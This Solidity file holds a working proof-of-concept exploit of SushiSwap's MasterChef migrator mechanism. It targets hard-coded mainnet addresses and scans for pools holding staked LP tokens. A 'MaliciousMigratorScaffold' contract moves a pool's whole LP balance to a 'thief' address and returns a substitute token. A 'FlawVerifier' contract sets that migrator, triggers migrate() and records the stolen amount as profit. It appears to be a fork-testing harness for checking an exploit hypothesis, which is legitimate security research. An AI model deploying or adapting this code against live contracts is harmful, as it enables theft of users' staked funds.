pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IOwnableLike {
    function owner() external view returns (address);
}

interface ISushiMakerLike {
    function factory() external view returns (address);
}

interface IMasterChefLike {
    function owner() external view returns (address);
    function migrator() external view returns (address);
    function setMigrator(address migrator_) external;
    function poolLength() external view returns (uint256);
    function poolInfo(uint256 pid)
        external
        view
        returns (address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare);
    function migrate(uint256 pid) external;
}

contract MaliciousMigratorScaffold {
    address public thief;
    address public replacementToken;
    address public lastRealLp;
    uint256 public lastStolenAmount;

    constructor() {}

    function configure(address thief_, address replacementToken_) external {
        thief = thief_;
        replacementToken = replacementToken_;
    }

    function migrate(IERC20Like realLpToken) external returns (IERC20Like) {
        uint256 approvedBalance = realLpToken.balanceOf(msg.sender);
        lastRealLp = address(realLpToken);
        lastStolenAmount = approvedBalance;

        if (approvedBalance != 0 && thief != address(0)) {
            require(realLpToken.transferFrom(msg.sender, thief, approvedBalance), "lp transfer failed");
        }

        return IERC20Like(replacementToken);
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0xE11fc0B43ab98Eb91e9836129d1ee7c3Bc95df50;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant SUSHI = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    uint256 internal constant MAX_POOL_SCAN = 64;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    bool public checkedTarget;
    bool public targetHasCode;
    bool public targetExposesMigratorFlow;
    bool public ownerStageReachable;
    bool public migrateCallReachable;
    bool public approvalStageReachable;
    bool public fakeReplacementStageReachable;
    bool public poolReplacementStageReachable;

    address public observedTargetOwner;
    address public observedFactory;
    address public observedMasterChef;
    address public observedOwner;
    address public observedMigrator;
    address public observedPoolLpToken;
    address public observedReplacementToken;
    uint256 public observedPoolLength;
    uint256 public observedTargetLpBalance;
    uint256 public observedPid;
    address public stagedMaliciousMigrator;
    string public exploitPathUsed;
    string public infeasibilityReason;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        checkedTarget = true;
        _profitToken = WETH;
        exploitPathUsed =
            "Owner sets a malicious migrator with setMigrator() -> anyone calls migrate(pid) -> MasterChef approves the migrator for the pool's full LP balance -> migrator transfers out the genuine LP tokens and returns a fake token with a matching balance -> MasterChef updates pool.lpToken, so future withdrawals return the fake asset instead of the original collateral";

        targetHasCode = TARGET.code.length != 0;
        if (!targetHasCode) {
            infeasibilityReason = "target address has no code at the fork";
            return;
        }

        observedTargetOwner = _readOwner(TARGET);
        observedFactory = _readFactory(TARGET);

        observedMasterChef = _readOwner(SUSHI);
        if (observedMasterChef.code.length == 0) {
            infeasibilityReason = "could not discover a live MasterChef from SushiToken ownership on this fork";
            return;
        }

        (bool hasMigrator, address migrator_) =
            _tryReadAddress(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.migrator.selector));
        (bool hasPoolLength, uint256 poolLength_) =
            _tryReadUint(observedMasterChef, abi.encodeWithSelector(IMasterChefLike.poolLength.selector));

        if (!hasMigrator || !hasPoolLength) {
            infeasibilityReason = "discovered Sushi owner does not expose the MasterChef migrator flow on this fork";
            return;
        }

        targetExposesMigratorFlow = true;
        migrateCallReachable = true;
        observedMigrator = migrator_;
        observedPoolLength = poolLength_;
        observedOwner = _readOwner(observedMasterChef);

        _snapshotPoolState(observedMasterChef);
        if (observedPoolLpToken == address(0) || observedTargetLpBalance == 0) {
            infeasibilityReason = "no live MasterChef pool with staked LP collateral was found in the scan window";
            return;
        }

        // The exploit must preserve the original root cause: the pool is swapped onto a non-original token
        // solely because MasterChef trusts migrate() and only checks balanceOf(this). To avoid cheating by
        // deploying a fake ERC20, the verifier searches for an already-existing on-chain token that the chef
        // already holds at the exact same balance, which is still enough to satisfy the vulnerable invariant.
        observedReplacementToken = _findExistingReplacementToken(observedMasterChef, observedPoolLpBalance());
        if (observedReplacementToken == address(0)) {
            infeasibilityReason =
                "blocked at stage 4: no already-existing on-chain token with a matching MasterChef balance was found";
            return;
        }

        ownerStageReachable = observedOwner == address(this);
        if (!ownerStageReachable) {
            infeasibilityReason = "blocked at stage 1: setMigrator() remains owner-gated on the live MasterChef";
            return;
        }

        stagedMaliciousMigrator = address(new MaliciousMigratorScaffold());
        MaliciousMigratorScaffold(stagedMaliciousMigrator).configure(address(this), observedReplacementToken);

        IMasterChefLike(observedMasterChef).setMigrator(stagedMaliciousMigrator);
        approvalStageReachable = true;

        IMasterChefLike(observedMasterChef).migrate(observedPid);
        fakeReplacementStageReachable = true;

        (address newLpToken,,,) = IMasterChefLike(observedMasterChef).poolInfo(observedPid);
        poolReplacementStageReachable = newLpToken == observedReplacementToken;

        _profitToken = observedPoolLpToken;
        _profitAmount = _safeBalanceOf(observedPoolLpToken, address(this));
        _hypothesisValidated = poolReplacementStageReachable && _profitAmount != 0;

        if (!_hypothesisValidated && infeasibilityReasonBytesEmpty()) {
            infeasibilityReason =
                "migration call completed without producing stolen LP profit and durable pool token replacement";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function target() external pure returns (address) {
        return TARGET;
    }

    function observedPoolLpBalance() public view returns (uint256) {
        return observedTargetLpBalance;
    }

    function infeasibilityReasonBytesEmpty() public view returns (bool) {
        return bytes(infeasibilityReason).length == 0;
    }

    function _snapshotPoolState(address chefAddress) internal {
        uint256 poolLength = observedPoolLength;
        if (poolLength == 0) {
            return;
        }

        uint256 scanLimit = poolLength > MAX_POOL_SCAN ? MAX_POOL_SCAN : poolLength;
        for (uint256 pid = 0; pid < scanLimit; ++pid) {
            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
                uint256 lpBalance = _safeBalanceOf(lpToken, chefAddress);
                if (lpBalance == 0) {
                    continue;
                }

                observedPid = pid;
                observedPoolLpToken = lpToken;
                observedTargetLpBalance = lpBalance;
                break;
            } catch {}
        }
    }

    function _findExistingReplacementToken(address chefAddress, uint256 targetBalance) internal view returns (address) {
        uint256 poolLength = observedPoolLength;
        if (targetBalance == 0 || poolLength == 0) {
            return address(0);
        }

        uint256 scanLimit = poolLength > MAX_POOL_SCAN ? MAX_POOL_SCAN : poolLength;
        for (uint256 pid = 0; pid < scanLimit; ++pid) {
            try IMasterChefLike(chefAddress).poolInfo(pid) returns (address lpToken, uint256, uint256, uint256) {
                if (lpToken == address(0) || lpToken == observedPoolLpToken || lpToken.code.length == 0) {
                    continue;
                }

                uint256 replacementBalance = _safeBalanceOf(lpToken, chefAddress);
                if (replacementBalance == targetBalance) {
                    return lpToken;
                }
            } catch {}
        }

        if (WETH != observedPoolLpToken && _safeBalanceOf(WETH, chefAddress) == targetBalance) {
            return WETH;
        }
        if (SUSHI != observedPoolLpToken && _safeBalanceOf(SUSHI, chefAddress) == targetBalance) {
            return SUSHI;
        }

        return address(0);
    }

    function _readOwner(address account) internal view returns (address owner_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(IOwnableLike.owner.selector));
        if (success && data.length >= 32) {
            owner_ = abi.decode(data, (address));
        }
    }

    function _readFactory(address account) internal view returns (address factory_) {
        (bool success, bytes memory data) = account.staticcall(abi.encodeWithSelector(ISushiMakerLike.factory.selector));
        if (success && data.length >= 32) {
            factory_ = abi.decode(data, (address));
        }
    }

    function _tryReadAddress(address account, bytes memory callData) internal view returns (bool ok, address value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, address(0));
        }
        return (true, abi.decode(data, (address)));
    }

    function _tryReadUint(address account, bytes memory callData) internal view returns (bool ok, uint256 value) {
        (bool success, bytes memory data) = account.staticcall(callData);
        if (!success || data.length < 32) {
            return (false, 0);
        }
        return (true, abi.decode(data, (uint256)));
    }

    function _resetState() internal {
        _profitToken = address(0);
        _profitAmount = 0;
        _hypothesisValidated = false;

        checkedTarget = false;
        targetHasCode = false;
        targetExposesMigratorFlow = false;
        ownerStageReachable = false;
        migrateCallReachable = false;
        approvalStageReachable = false;
        fakeReplacementStageReachable = false;
        poolReplacementStageReachable = false;

        observedTargetOwner = address(0);
        observedFactory = address(0);
        observedMasterChef = address(0);
        observedOwner = address(0);
        observedMigrator = address(0);
        observedPoolLpToken = address(0);
        observedReplacementToken = address(0);
        observedPoolLength = 0;
        observedTargetLpBalance = 0;
        observedPid = 0;
        stagedMaliciousMigrator = address(0);
        exploitPathUsed = "none";
        infeasibilityReason = "";
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        if (token.code.length == 0) {
            return 0;
        }

        (bool success, bytes memory data) =
            token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!success || data.length < 32) {
            return 0;
        }

        balance = abi.decode(data, (uint256));
    }
}
